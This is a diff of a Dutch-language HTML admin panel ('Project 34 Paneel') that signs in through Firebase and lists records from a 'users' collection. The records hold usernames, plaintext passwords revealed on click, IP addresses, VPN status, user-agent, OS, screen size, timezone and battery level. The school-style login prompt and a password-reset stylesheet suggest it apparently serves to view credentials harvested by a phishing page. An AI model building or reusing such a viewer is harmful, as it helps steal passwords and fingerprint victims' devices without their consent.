@@ -1,1 +1,271 @@
-<!DOCTYPE html> <html lang="nl"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Project 34 Paneel – Terminal Login</title> <!-- (optioneel) je bestaande styles/libs --> <link href="../css/css.css" rel="stylesheet"> <link href="../css/custom.css" rel="stylesheet" type="text/css"> <link href="../css/ssrpm.css" rel="stylesheet" type="text/css"> <link rel="shortcut icon" href="../images/favicon.ico" type="image/x-icon"> <link rel="icon" href="../images/favicon.ico" type="image/ico"> <script src="../js/jquery.js"></script> <script src="../js/bootstrap.js"></script> <!-- Monospace voor terminal-look --> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&display=swap" rel="stylesheet"> <style> :root{ --bg:#ffffff; --ink:#111111; --muted:#5a5a5a; --accent:#111; --blue:#0b6cf0; --line:#111; --danger:#e53935; } *{box-sizing:border-box} html,body{height:100%} body{ margin:0; background:var(--bg); color:var(--ink); font-family:"IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; } .wrap{max-width:980px; margin:0 auto; padding:28px 16px 60px;} .terminal-line{white-space:pre-wrap; font-size:15px; line-height:1.55;} .muted{color:var(--muted)} .prompt{display:flex; align-items:center; gap:10px; margin:6px 0 16px;} .prompt-label{white-space:nowrap} .prompt-input{ flex:1; border:none; border-bottom:1px solid var(--line); outline:none; padding:6px 4px; background:transparent; color:var(--ink); font:inherit; } .prompt-input::placeholder{color:#999} .prompt-input:focus{border-bottom-color:var(--blue); box-shadow:0 1px 0 0 var(--blue)} .error{color:var(--danger); margin:4px 0 0 0} .caret::after{content:"▁"; display:inline-block; margin-left:2px; animation:blink 1.1s steps(1,end) infinite} @keyframes blink{50%{opacity:0}} /* Paneel (dashboard) */ .grid{display:grid; grid-template-columns: 380px 1fr; gap:18px; margin-top:10px} @media (max-width: 980px){ .grid{grid-template-columns:1fr} } .box{border:1px solid var(--line); padding:12px; background:#fff} .box + .box{margin-top:10px} .search{ display:flex; align-items:center; gap:10px; margin-bottom:10px; border:1px solid var(--line); padding:8px; background:#fff; } .search input{ flex:1; border:none; outline:none; background:transparent; color:var(--ink); font:inherit; } .list{display:flex; flex-direction:column; gap:8px} .item{border:1px solid var(--line); padding:10px 12px; cursor:pointer; background:#fff} .item:hover{background:#f7f7f7} .item.selected{background:#111; color:#fff} .detail-row{border:1px solid var(--line); padding:10px 12px; background:#fff} .mono{font-family:inherit} .h{font-weight:700; margin-bottom:6px} /* klikbare wachtwoordchip */ .pwd-chip{display:inline-block; padding:2px 6px; border:1px solid var(--line); cursor:pointer; user-select:none} .pwd-chip:hover{background:#f7f7f7} </style> <!-- Firebase SDK --> <script type="module"> import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js"; import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js"; import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js"; const firebaseConfig = { apiKey: "AIzaSyClpvIHEe98giJTQxO-bNbUci0i4LOmj3U", authDomain: "project34-baebd.firebaseapp.com", projectId: "project34-baebd", storageBucket: "project34-baebd.firebasestorage.app", messagingSenderId: "92418567493", appId: "1:92418567493:web:6d51d4af2b66ed14c3e22c" }; const app = initializeApp(firebaseConfig); const auth = getAuth(app); const db = getFirestore(app); // Router op auth onAuthStateChanged(auth, (user) => user ? renderPanel() : renderLogin()); // ===== LOGIN VIEW ===== function renderLogin(){ document.body.innerHTML = <div class="wrap"> <div class="terminal-line">voer hier onder je email in</div> <div class="prompt"> <div class="prompt-label">sgdc@spinoza-login%</div> <input id="email" class="prompt-input" type="email" placeholder="naam@voorbeeld.nl" autofocus /> </div> <div class="terminal-line">voer hier onder je wachtwoord in</div> <div class="prompt"> <div class="prompt-label">sgdc@spinoza-login%</div> <input id="password" class="prompt-input" type="password" placeholder="••••••••" /> </div> <div id="msg" class="terminal-line muted caret">ready</div> </div> ; const emailEl = document.getElementById('email'); const pwdEl = document.getElementById('password'); const msgEl = document.getElementById('msg'); function tryLogin(){ const email = emailEl.value.trim(); const pass = pwdEl.value; if(!email || !pass){ showError(); return; } signInWithEmailAndPassword(auth, email, pass) .catch(() => showError()); } function showError(){ msgEl.classList.remove('muted','caret'); msgEl.classList.add('error'); msgEl.textContent = 'een van de ingevoerde gegevens is fout probeer opnieuw'; } // Enter op email => focus wachtwoord; Enter op wachtwoord => login emailEl.addEventListener('keydown', (e)=>{ if(e.key==='Enter'){ e.preventDefault(); pwdEl.focus(); } }); pwdEl.addEventListener('keydown', (e)=>{ if(e.key==='Enter'){ e.preventDefault(); tryLogin(); } }); } // ===== PANEL VIEW ===== async function renderPanel(){ // haal data let users = []; try{ const snap = await getDocs(query(collection(db,'users'), orderBy('timestamp','desc'))); snap.forEach(doc => users.push({id:doc.id, ...doc.data()})); }catch(e){ // toon leeg paneel } document.body.innerHTML = <div class="wrap"> <div class="grid"> <!-- LINKS: zoek + lijst --> <div> <div class="search"> <span>zoek:</span> <input id="search" placeholder="gebruikersnaam…" /> <button id="logoutBtn" style="border:1px solid var(--line); background:#fff; cursor:pointer; font:inherit; padding:6px 8px">uitloggen</button> </div> <div class="box"> <div class="h">lijst</div> <div id="list" class="list"> ${users.map(u=>{ const ts = u.timestamp?.toDate ? u.timestamp.toDate() : (u.timestamp ? new Date(u.timestamp) : null); const tsStr = ts ? new Date(ts).toLocaleString() : ''; return <div class="item" data-id="${u.id}"> - ${u.username || 'Onbekend'} ${tsStr ? · ${tsStr}:''} ${u.ipAddress ? · ${u.ipAddress}:''} </div> ; }).join('')} </div> </div> </div> <!-- RECHTS: details --> <div> <div class="box"> <div class="h">details</div> <div id="details"> <div class="detail-row muted">[ ] selecteer een gebruiker links.</div> </div> </div> </div> </div> </div> ; // Interactie const search = document.getElementById('search'); const list = document.getElementById('list'); const det = document.getElementById('details'); // zoeken search.addEventListener('input', e=>{ const term = e.target.value.toLowerCase(); list.querySelectorAll('.item').forEach(el=>{ const txt = el.textContent.toLowerCase(); el.style.display = txt.includes(term) ? '' : 'none'; }); }); // select user + wachtwoord toggle list.querySelectorAll('.item').forEach(el=>{ el.addEventListener('click', ()=>{ list.querySelectorAll('.item').forEach(n=>n.classList.remove('selected')); el.classList.add('selected'); const id = el.getAttribute('data-id'); const u = users.find(x=>x.id===id) || {}; const ts = u.timestamp?.toDate ? u.timestamp.toDate() : (u.timestamp ? new Date(u.timestamp) : null); const tsStr = ts ? new Date(ts).toLocaleString() : 'Onbekend'; const safePwd = (u.password && typeof u.password === 'string') ? u.password : 'Niet beschikbaar'; det.innerHTML = <div class="detail-row">[ username ] ${u.username || 'Niet beschikbaar'}</div> <div class="detail-row">[ password ] <span id="pwd-${id}" class="pwd-chip mono" data-state="hidden" data-value="${encodeHtml( safePwd )}">••••••••</span> <span class="muted">— klik om te tonen/verbergen</span></div> <div class="detail-row">[ vpn ] ${u.vpnUsed===true?'Ja':(u.vpnUsed===false?'Nee':'Onbekend')}</div> <div class="detail-row">[ ip ] <span class="mono">${u.ipAddress || 'Niet beschikbaar'}</span></div> <div class="detail-row">[ server ] ${u.serverLocation || 'Niet beschikbaar'}</div> <div class="detail-row">[ user-agent ] <span class="mono">${u.userAgent || 'Niet beschikbaar'}</span></div> <div class="detail-row">[ os ] ${u.operatingSystem || 'Niet beschikbaar'}</div> <div class="detail-row">[ screen ] ${u.screenSize || 'Niet beschikbaar'}</div> <div class="detail-row">[ lang ] ${u.language || 'Niet beschikbaar'}</div> <div class="detail-row">[ tz ] ${u.timezone || 'Niet beschikbaar'}</div> <div class="detail-row">[ battery ] ${u.battery || 'Niet beschikbaar'}</div> <div class="detail-row">[ timestamp ] ${tsStr}</div> ; // toggle logic const pwdEl = document.getElementById(pwd-${id}); pwdEl.addEventListener('click', ()=>{ const state = pwdEl.getAttribute('data-state'); if(state === 'hidden'){ pwdEl.textContent = pwdEl.getAttribute('data-value') || 'Niet beschikbaar'; pwdEl.setAttribute('data-state','shown'); }else{ pwdEl.textContent = '••••••••'; pwdEl.setAttribute('data-state','hidden'); } }); }); }); // logout document.getElementById('logoutBtn').addEventListener('click', ()=> signOut(auth)); // helper: simple HTML escape for attribute injection safety function encodeHtml(s){ return String(s) .replaceAll('&','&amp;') .replaceAll('<','&lt;') .replaceAll('>','&gt;') .replaceAll('"','&quot;') .replaceAll("'","&#039;"); } // expose so template string above can call it window.encodeHtml = encodeHtml; } </script> </head> <body> <!-- Inhoud wordt dynamisch gerenderd --> </body> </html>
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Project 34 Paneel – Terminal Login</title>
+
+  <!-- (optioneel) je bestaande styles/libs -->
+  <link href="../css/css.css" rel="stylesheet">
+  <link href="../css/custom.css" rel="stylesheet" type="text/css">
+  <link href="../css/ssrpm.css" rel="stylesheet" type="text/css">
+  <link rel="shortcut icon" href="../images/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="../images/favicon.ico" type="image/ico">
+  <script src="../js/jquery.js"></script>
+  <script src="../js/bootstrap.js"></script>
+
+  <!-- Monospace voor terminal-look -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#ffffff; --ink:#111111; --muted:#5a5a5a; --accent:#111; --blue:#0b6cf0;
+      --line:#111; --danger:#e53935;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0; background:var(--bg); color:var(--ink);
+      font-family:"IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+    .wrap{max-width:980px; margin:0 auto; padding:28px 16px 60px;}
+    .terminal-line{white-space:pre-wrap; font-size:15px; line-height:1.55;}
+    .muted{color:var(--muted)}
+    .prompt{display:flex; align-items:center; gap:10px; margin:6px 0 16px;}
+    .prompt-label{white-space:nowrap}
+    .prompt-input{
+      flex:1; border:none; border-bottom:1px solid var(--line); outline:none; padding:6px 4px;
+      background:transparent; color:var(--ink); font:inherit;
+    }
+    .prompt-input::placeholder{color:#999}
+    .prompt-input:focus{border-bottom-color:var(--blue); box-shadow:0 1px 0 0 var(--blue)}
+
+    .error{color:var(--danger); margin:4px 0 0 0}
+    .caret::after{content:"▁"; display:inline-block; margin-left:2px; animation:blink 1.1s steps(1,end) infinite}
+    @keyframes blink{50%{opacity:0}}
+
+    /* Paneel (dashboard) */
+    .grid{display:grid; grid-template-columns: 380px 1fr; gap:18px; margin-top:10px}
+    @media (max-width: 980px){ .grid{grid-template-columns:1fr} }
+    .box{border:1px solid var(--line); padding:12px; background:#fff}
+    .box + .box{margin-top:10px}
+
+    .search{
+      display:flex; align-items:center; gap:10px; margin-bottom:10px;
+      border:1px solid var(--line); padding:8px; background:#fff;
+    }
+    .search input{
+      flex:1; border:none; outline:none; background:transparent; color:var(--ink); font:inherit;
+    }
+
+    .list{display:flex; flex-direction:column; gap:8px}
+    .item{border:1px solid var(--line); padding:10px 12px; cursor:pointer; background:#fff}
+    .item:hover{background:#f7f7f7}
+    .item.selected{background:#111; color:#fff}
+
+    .detail-row{border:1px solid var(--line); padding:10px 12px; background:#fff}
+    .mono{font-family:inherit}
+    .h{font-weight:700; margin-bottom:6px}
+
+    /* klikbare wachtwoordchip */
+    .pwd-chip{display:inline-block; padding:2px 6px; border:1px solid var(--line); cursor:pointer; user-select:none}
+    .pwd-chip:hover{background:#f7f7f7}
+  </style>
+
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js";
+    import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyClpvIHEe98giJTQxO-bNbUci0i4LOmj3U",
+      authDomain: "project34-baebd.firebaseapp.com",
+      projectId: "project34-baebd",
+      storageBucket: "project34-baebd.firebasestorage.app",
+      messagingSenderId: "92418567493",
+      appId: "1:92418567493:web:6d51d4af2b66ed14c3e22c"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+
+    // Router op auth
+    onAuthStateChanged(auth, (user) => user ? renderPanel() : renderLogin());
+
+    // ===== LOGIN VIEW =====
+    function renderLogin(){
+      document.body.innerHTML = `
+        <div class="wrap">
+          <div class="terminal-line">voer hier onder je email in</div>
+          <div class="prompt">
+            <div class="prompt-label">sgdc@spinoza-login%</div>
+            <input id="email" class="prompt-input" type="email" placeholder="naam@voorbeeld.nl" autofocus />
+          </div>
+
+          <div class="terminal-line">voer hier onder je wachtwoord in</div>
+          <div class="prompt">
+            <div class="prompt-label">sgdc@spinoza-login%</div>
+            <input id="password" class="prompt-input" type="password" placeholder="••••••••" />
+          </div>
+
+          <div id="msg" class="terminal-line muted caret">ready</div>
+        </div>
+      `;
+
+      const emailEl = document.getElementById('email');
+      const pwdEl   = document.getElementById('password');
+      const msgEl   = document.getElementById('msg');
+
+      function tryLogin(){
+        const email = emailEl.value.trim();
+        const pass  = pwdEl.value;
+        if(!email || !pass){ showError(); return; }
+        signInWithEmailAndPassword(auth, email, pass)
+          .catch(() => showError());
+      }
+
+      function showError(){
+        msgEl.classList.remove('muted','caret');
+        msgEl.classList.add('error');
+        msgEl.textContent = 'een van de ingevoerde gegevens is fout probeer opnieuw';
+      }
+
+      // Enter op email => focus wachtwoord; Enter op wachtwoord => login
+      emailEl.addEventListener('keydown', (e)=>{ if(e.key==='Enter'){ e.preventDefault(); pwdEl.focus(); } });
+      pwdEl.addEventListener('keydown',   (e)=>{ if(e.key==='Enter'){ e.preventDefault(); tryLogin(); } });
+    }
+
+    // ===== PANEL VIEW =====
+    async function renderPanel(){
+      // haal data
+      let users = [];
+      try{
+        const snap = await getDocs(query(collection(db,'users'), orderBy('timestamp','desc')));
+        snap.forEach(doc => users.push({id:doc.id, ...doc.data()}));
+      }catch(e){
+        // toon leeg paneel
+      }
+
+      document.body.innerHTML = `
+        <div class="wrap">
+          <div class="grid">
+            <!-- LINKS: zoek + lijst -->
+            <div>
+              <div class="search">
+                <span>zoek:</span>
+                <input id="search" placeholder="gebruikersnaam…" />
+                <button id="logoutBtn" style="border:1px solid var(--line); background:#fff; cursor:pointer; font:inherit; padding:6px 8px">uitloggen</button>
+              </div>
+              <div class="box">
+                <div class="h">lijst</div>
+                <div id="list" class="list">
+                  ${users.map(u=>{
+                    const ts = u.timestamp?.toDate ? u.timestamp.toDate() : (u.timestamp ? new Date(u.timestamp) : null);
+                    const tsStr = ts ? new Date(ts).toLocaleString() : '';
+                    return `
+                      <div class="item" data-id="${u.id}">
+                        - ${u.username || 'Onbekend'} ${tsStr ? `· ${tsStr}`:''} ${u.ipAddress ? `· ${u.ipAddress}`:''}
+                      </div>
+                    `;
+                  }).join('')}
+                </div>
+              </div>
+            </div>
+
+            <!-- RECHTS: details -->
+            <div>
+              <div class="box">
+                <div class="h">details</div>
+                <div id="details">
+                  <div class="detail-row muted">[ ] selecteer een gebruiker links.</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+
+      // Interactie
+      const search = document.getElementById('search');
+      const list   = document.getElementById('list');
+      const det    = document.getElementById('details');
+
+      // zoeken
+      search.addEventListener('input', e=>{
+        const term = e.target.value.toLowerCase();
+        list.querySelectorAll('.item').forEach(el=>{
+          const txt = el.textContent.toLowerCase();
+          el.style.display = txt.includes(term) ? '' : 'none';
+        });
+      });
+
+      // select user + wachtwoord toggle
+      list.querySelectorAll('.item').forEach(el=>{
+        el.addEventListener('click', ()=>{
+          list.querySelectorAll('.item').forEach(n=>n.classList.remove('selected'));
+          el.classList.add('selected');
+          const id = el.getAttribute('data-id');
+          const u  = users.find(x=>x.id===id) || {};
+          const ts = u.timestamp?.toDate ? u.timestamp.toDate() : (u.timestamp ? new Date(u.timestamp) : null);
+          const tsStr = ts ? new Date(ts).toLocaleString() : 'Onbekend';
+
+          const safePwd = (u.password && typeof u.password === 'string') ? u.password : 'Niet beschikbaar';
+
+          det.innerHTML = `
+            <div class="detail-row">[ username ] ${u.username || 'Niet beschikbaar'}</div>
+            <div class="detail-row">[ password ] <span id="pwd-${id}" class="pwd-chip mono" data-state="hidden" data-value="${encodeHtml(
+              safePwd
+            )}">••••••••</span>  <span class="muted">— klik om te tonen/verbergen</span></div>
+            <div class="detail-row">[ vpn ] ${u.vpnUsed===true?'Ja':(u.vpnUsed===false?'Nee':'Onbekend')}</div>
+            <div class="detail-row">[ ip ] <span class="mono">${u.ipAddress || 'Niet beschikbaar'}</span></div>
+            <div class="detail-row">[ server ] ${u.serverLocation || 'Niet beschikbaar'}</div>
+            <div class="detail-row">[ user-agent ] <span class="mono">${u.userAgent || 'Niet beschikbaar'}</span></div>
+            <div class="detail-row">[ os ] ${u.operatingSystem || 'Niet beschikbaar'}</div>
+            <div class="detail-row">[ screen ] ${u.screenSize || 'Niet beschikbaar'}</div>
+            <div class="detail-row">[ lang ] ${u.language || 'Niet beschikbaar'}</div>
+            <div class="detail-row">[ tz ] ${u.timezone || 'Niet beschikbaar'}</div>
+            <div class="detail-row">[ battery ] ${u.battery || 'Niet beschikbaar'}</div>
+            <div class="detail-row">[ timestamp ] ${tsStr}</div>
+          `;
+
+          // toggle logic
+          const pwdEl = document.getElementById(`pwd-${id}`);
+          pwdEl.addEventListener('click', ()=>{
+            const state = pwdEl.getAttribute('data-state');
+            if(state === 'hidden'){
+              pwdEl.textContent = pwdEl.getAttribute('data-value') || 'Niet beschikbaar';
+              pwdEl.setAttribute('data-state','shown');
+            }else{
+              pwdEl.textContent = '••••••••';
+              pwdEl.setAttribute('data-state','hidden');
+            }
+          });
+        });
+      });
+
+      // logout
+      document.getElementById('logoutBtn').addEventListener('click', ()=> signOut(auth));
+
+      // helper: simple HTML escape for attribute injection safety
+      function encodeHtml(s){
+        return String(s)
+          .replaceAll('&','&amp;')
+          .replaceAll('<','&lt;')
+          .replaceAll('>','&gt;')
+          .replaceAll('"','&quot;')
+          .replaceAll("'","&#039;");
+      }
+      // expose so template string above can call it
+      window.encodeHtml = encodeHtml;
+    }
+  </script>
+</head>
+<body>
+  <!-- Inhoud wordt dynamisch gerenderd -->
+</body>
+</html>
